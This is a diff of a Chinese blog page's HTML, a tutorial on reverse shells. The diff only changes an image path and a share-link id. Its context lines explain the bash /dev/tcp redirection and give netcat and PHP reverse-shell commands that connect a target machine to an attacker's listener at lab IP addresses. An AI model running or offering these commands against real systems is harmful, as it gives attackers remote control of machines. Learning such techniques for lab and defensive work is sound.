@@ -115,7 +115,7 @@
 <li>当<code>&gt;&amp;</code>后面接文件描述符时，表示将前面的文件描述符重定向到后面的文件描述符</li>
 </ul>
 <h5 id="反弹shell语句含义"><a href="#反弹shell语句含义" class="headerlink" title="反弹shell语句含义"></a>反弹shell语句含义</h5><p><code>bash -i</code>表示在本地打开一个bash，<code>/dev/tcp/VPS_IP/VPS_Port</code>中<code>/dev/tcp/</code>是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，<code>&gt;&amp; /dev/tcp/VPS_IP/VPS_Port</code>表示将标准输出和标准错误输出重定向到这个文件上，即传递给远程，如果远程开启了对应端口的监听，就会接收到这个bash的标准输出和标准错误输出。</p>
-<p>此时在本地输入命令，本地是看不到输入的内容的，因为输入设备输入的命令和输出以及错误输出的内容已经被传递到远程上。<br><img src="/20230313161007.png"><br>现在攻击机开启侦听端口<br><img src="/2020230313161036.png"><br>然后再靶机输入指令，确保靶机再bash状态中<br><img src="/20230313161127.png"><br><code>0&gt;&amp;1</code>表示将标准输入重定向到标准输出，然而此时标准输出已重定向到<code>/dev/tcp/VPS_IP/VPS_Port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，所以可以直接在远程输入了。</p>
+<p>此时在本地输入命令，本地是看不到输入的内容的，因为输入设备输入的命令和输出以及错误输出的内容已经被传递到远程上。<br><img src="/./image/20230313161007.png"><br>现在攻击机开启侦听端口<br><img src="/2020230313161036.png"><br>然后再靶机输入指令，确保靶机再bash状态中<br><img src="/20230313161127.png"><br><code>0&gt;&amp;1</code>表示将标准输入重定向到标准输出，然而此时标准输出已重定向到<code>/dev/tcp/VPS_IP/VPS_Port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，所以可以直接在远程输入了。</p>
 <h4 id="基于nc的反弹shell"><a href="#基于nc的反弹shell" class="headerlink" title="基于nc的反弹shell"></a>基于nc的反弹shell</h4><p>开启本地侦听<br><code>nc -lvvp 2233</code><br><img src="/20230313195640.png"><br>目标机连接攻击机<br><code>nc 192.168.62.152 2233 -e /bin/bash</code><br><img src="/20230313200124.png"><br><img src="/20230313200142.png"></p>
 <h4 id="基于nc没有-e参数的反弹shell"><a href="#基于nc没有-e参数的反弹shell" class="headerlink" title="基于nc没有-e参数的反弹shell"></a>基于nc没有-e参数的反弹shell</h4><p>开启端口侦听，一个输入端口，一个输出端口<br><img src="/20230313200636.png"><br><img src="/20230313200647.png"><br>目标机连接攻击机<br><img src="/20230313200810.png"></p>
 <h4 id="基于php的反弹shell"><a href="#基于php的反弹shell" class="headerlink" title="基于php的反弹shell"></a>基于php的反弹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -c &#x27;</span> bash -i &gt;&amp; /dev/tcp/<span class="number">10.10</span>.<span class="number">10.128</span>/<span class="number">22333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&#x27;&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -129,7 +129,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://blog.kmeeu.cn/2024/06/24/%E5%8F%8D%E5%BC%B9shell/" data-id="clxsqmrk800009o1o2hzyg29w" data-title="反弹shell" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://blog.kmeeu.cn/2024/06/24/%E5%8F%8D%E5%BC%B9shell/" data-id="clxsqtycu0000fc1oejyhbt7k" data-title="反弹shell" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
